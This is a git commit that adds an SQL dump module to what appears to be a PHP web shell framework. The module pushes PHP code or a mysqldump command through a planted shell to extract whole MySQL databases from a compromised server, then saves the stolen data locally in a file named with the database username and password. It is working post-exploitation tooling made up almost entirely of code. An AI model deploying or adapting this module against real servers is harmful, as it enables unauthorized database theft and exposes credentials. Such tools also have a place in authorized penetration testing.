6357c6ebc524a924dd31a86fd6b6b33e4a4d7590
Emilio Pinna <emilio.pinn@gmail.com>
2012-12-05 22:37:46 +0100

    Ported sql.dump to v1

---
+++ modules/sql/dump.py
@@ -0,0 +1,135 @@
+from core.moduleprobeall import ModuleProbeAll
+from core.moduleexception import ProbeException, ProbeSucceed
+from core.vector import VectorList, Vector
+from core.savedargparse import SavedArgumentParser as ArgumentParser
+
+mysqlphpdump = """
+function dmp ($tableQ)
+{
+    $result = "\n-- Dumping data for table `$tableQ`\n";
+    $query = mysql_query("SELECT * FROM ".$tableQ);
+    $numrow = mysql_num_rows($query);
+    $numfields = mysql_num_fields($query);
+    print $numrow . " " . $numfields;
+    if ($numrow > 0)
+    {
+        $result .= "INSERT INTO `".$tableQ."` (";
+        $i = 0;
+        for($k=0; $k<$numfields; $k++ )
+        {
+            $result .= "`".mysql_field_name($query, $k)."`";
+            if ($k < ($numfields-1))
+                $result .= ", ";
+        }
+        $result .= ") VALUES ";
+        while ($row = mysql_fetch_row($query))
+        {
+            $result .= " (";
+            for($j=0; $j<$numfields; $j++)
+            {
+                if (mysql_field_type($query, $j) == "string" ||
+                    mysql_field_type($query, $j) == "timestamp" ||
+                    mysql_field_type($query, $j) == "time" ||
+                    mysql_field_type($query, $j) == "datetime" ||
+                    mysql_field_type($query, $j) == "blob")
+                {
+                    $row[$j] = addslashes($row[$j]);
+                    $row[$j] = ereg_replace("\n","\\n",$row[$j]);
+                    $row[$j] = ereg_replace("\r","",$row[$j]);
+                    $result .= "'$row[$j]'";
+                }
+                else if (is_null($row[$j]))
+                    $result .= "NULL";
+                else
+                    $result .= $row[$j];
+                if ( $j<($numfields-1))
+                    $result .= ", ";
+            }
+            $result .= ")";
+            $i++;
+            if ($i < $numrow)
+                $result .= ",";
+            else
+                $result .= ";";
+            $result .= "\n";
+        }
+    }
+    else
+        $result .= "-- table is empty";
+    return $result . "\n\n";
+}
+ini_set('mysql.connect_timeout',1);
+$res=mysql_connect("$host", "$user", "$pass");
+if(!$res) { print("-- DEFAULT\n"); }
+else {
+$db_name = "$db";
+$db_table_name = "$table";
+mysql_select_db($db_name);
+$tableQ = mysql_list_tables ($db_name);
+$i = 0;
+$num_rows = mysql_num_rows ($tableQ);
+if($num_rows) {
+while ($i < $num_rows)
+{
+    $tb_names[$i] = mysql_tablename ($tableQ, $i);
+    if(($db_table_name == $tb_names[$i]) || $db_table_name == "") {
+        print(dmp($tb_names[$i]));
+    }
+    $i++;
+}
+}
+mysql_close();
+}"""
+
+WARN_DUMP_ERR_SAVING = 'Can\'t save dump file'
+WARN_DUMP_SAVED = 'Dump file saved'
+WARN_DUMP_INCOMPLETE = 'Dump seems incorrect, saving anyway for debug purposes'
+WARN_NO_DUMP = 'Dump failed, check credentials and dbms informations'
+
+class Dump(ModuleProbeAll):
+    '''Get SQL database dump'''
+    
+    vectors = VectorList([
+        Vector('shell.php', 'mysqlphpdump', [ mysqlphpdump ] ),  
+        Vector('shell.sh', 'mysqldump', "mysqldump -h $host -u $user --password=$pass $db $table --single-transaction") ,
+    # --single-transaction to avoid bug http://bugs.mysql.com/bug.php?id=21527        
+    ])
+    
+    
+    
+    argparser = ArgumentParser(usage=__doc__)
+    argparser.add_argument('user', help='SQL username')
+    argparser.add_argument('pass', help='SQL password')
+    argparser.add_argument('db', help='Database to dump')
+    argparser.add_argument('-table', help='Table to dump')
+    argparser.add_argument('-host', help='DBMS host or host:port', default='127.0.0.1')
+    #argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
+    argparser.add_argument('-vector', choices = vectors.get_names())
+    argparser.add_argument('-ldump', help='Where to save dump')
+        
+    def _prepare_vector(self):
+        if not self.args['table']:
+            self.args['table'] = ''
+        self.args_formats = self.args.copy()
+        
+    def _verify_execution(self):
+        if self._result and '-- Dumping data for table' in self._result:
+            raise ProbeSucceed(self.name,'Dumped')
+            
+    def _output_result(self):
+        
+        if self._result: 
+            if not '-- Dumping data for table' in self._result:
+                self.mprint(WARN_DUMP_INCOMPLETE)
+            
+            if not self.args['ldump']:
+                self.args['ldump'] = '%s:%s@%s-%s.txt' % (self.args['user'], self.args['pass'], self.args['host'], self.args['db'])
+                
+            try:
+                lfile = open(self.args['ldump'],'w').write(self._result)
+            except:
+                raise ProbeException(self.name,  "\'%s\' %s" % (self.args['ldump'], WARN_DUMP_ERR_SAVING))
+            else:
+                self.mprint("\'%s\' %s" % (self.args['ldump'], WARN_DUMP_SAVED))
+        else:
+            raise ProbeException(self.name,  WARN_NO_DUMP)
